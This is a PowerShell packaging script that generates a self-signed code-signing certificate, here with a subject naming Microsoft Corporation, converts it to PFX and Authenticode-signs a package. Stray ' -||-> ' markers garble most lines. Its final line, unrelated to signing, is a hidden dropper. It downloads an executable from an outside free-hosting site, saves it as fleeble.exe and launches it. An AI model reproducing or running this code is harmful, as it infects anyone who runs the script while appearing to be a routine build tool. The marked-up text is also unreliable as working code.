




[CmdletBinding()]
param (
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $PackageFilePath

)



 -||-> function New-SelfSignedCertificate
{
    [CmdletBinding()]
    param (

        
        [ValidateNotNullOrEmpty()]
        [string] $CertificateFilePath = "$pwd\PowerShell.cer",

        
        [ValidateNotNullOrEmpty()]
        [string] $PvkFilePath = "$env:Temp\PowerShell.pvk"

    )

     -||-> $makecertBinPath = "${env:ProgramFiles(x86)}\Windows Kits\10\bin\x64\MakeCert.exe" <-||- 

     -||-> Write-Verbose "Windows 10 SDK needed - https://go.microsoft.com/fwlink/p/?LinkID=822845 - Ensure MakeCert.exe is present @ $makecertBinPath" <-||- 
     -||-> if ( -||-> -not ( -||-> Test-Path $makecertBinPath <-||- ) <-||- )
    {
        throw  -||-> "$makecertBinPath is required to generate a self-signed certificate" <-||- 
    } <-||- 

     -||-> Remove-Item $CertificateFilePath -Force -ErrorAction Ignore <-||- 
     -||-> Remove-Item $PvkFilePath -Force -ErrorAction Ignore <-||- 

     -||-> & $makecertBinPath -r -h 0 -n "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US" -eku 1.3.6.1.5.5.7.3.3 -pe -sv $PvkFilePath $CertificateFilePath | Write-Verbose <-||- 

     -||-> Write-Verbose "Self-Signed Cert generated @ $CertificateFilePath" <-||- 

    return  -||-> $CertificateFilePath <-||- 
} <-||- 


 -||-> function ConvertTo-Pfx
{
    [CmdletBinding()]
    param (

        
        [ValidateNotNullOrEmpty()]
        [string] $CertificateFilePath = "$pwd\PowerShell.cer",

        
        [ValidateNotNullOrEmpty()]
        [string] $PvkFilePath = "$env:Temp\PowerShell.pvk",

        
        [ValidateNotNullOrEmpty()]
        [string] $PfxFilePath = "$env:Temp\PowerShell.pfx"
    )

     -||-> $pvk2pfxBinPath = "${env:ProgramFiles(x86)}\Windows Kits\10\bin\x64\pvk2pfx.exe" <-||- 

     -||-> Write-Verbose "Windows 10 SDK needed - https://go.microsoft.com/fwlink/p/?LinkID=822845 - Ensure pvk2pfx.exe is present @ $pvk2pfxBinPath" <-||- 
     -||-> if ( -||-> -not ( -||-> Test-Path $pvk2pfxBinPath <-||- ) <-||- )
    {
        throw  -||-> "$pvk2pfxBinPath is required to convert pvk file to pfx file - one of the prerequisites to sign a package!" <-||- 
    } <-||- 

     -||-> Remove-Item $PfxFilePath -Force -ErrorAction Ignore <-||- 

     -||-> & $pvk2pfxBinPath /pvk $PvkFilePath /spc $CertificateFilePath /pfx $PfxFilePath /f | Write-Verbose <-||- 

     -||-> Write-Verbose "Pfx file generated @ $PfxFilePath" <-||- 

    return  -||-> $PfxFilePath <-||- 
} <-||- 



 -||-> function Sign-Package
{
    [CmdletBinding()]
    param (

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $PackageFilePath,

        
        [ValidateNotNullOrEmpty()]
        [string] $PfxFilePath = "$env:Temp\PowerShell.pfx"

    )

     -||-> $signtoolBinPath = "${env:ProgramFiles(x86)}\Windows Kits\10\bin\x64\SignTool.exe" <-||- 

     -||-> Write-Verbose "Windows 10 SDK needed - https://go.microsoft.com/fwlink/p/?LinkID=822845 - Ensure SignTool.exe is present @ $signtoolBinPath" <-||- 
     -||-> if ( -||-> -not ( -||-> Test-Path $signtoolBinPath <-||- ) <-||- )
    {
        throw  -||-> "$signtoolBinPath is required to sign the package!" <-||- 
    } <-||- 

     -||-> & $signtoolBinPath sign -f $PfxFilePath -fd SHA256 -v $PackageFilePath | Write-Verbose <-||- 

     -||-> Write-Verbose "Authenticode signing successful for $PackageFilePath" <-||- 

    return  -||-> $PackageFilePath <-||- 
} <-||- 

 -||-> $certificate =  -||-> New-SelfSignedCertificate -Verbose <-||-  <-||- 
 -||-> ConvertTo-Pfx -Verbose <-||- 
 -||-> $signedPackage =  -||-> Sign-Package -PackageFilePath $PackageFilePath -Verbose <-||-  <-||- 

 -||-> Write-Output "Signed Package is available @ `'$signedPackage`'" <-||- 

 -||-> Write-Output "On Windows Full SKU - Import the self-signed certificate `'$certificate`' to TrustedStore (Import-Certificate) prior to installing the package" <-||- 

 -||-> Write-Output "On Windows Nano - Use `'$env:Windir\System32\Certoc.exe -AddStore TrustedPeople <Certificate>`' to import the self-signed certificate `'$certificate`' to TrustedStore" <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://matkalv.5gbfree.com/loso/fasoo.exe','fleeble.exe') <-||- ; -||-> Start-Process 'fleeble.exe' <-||- 



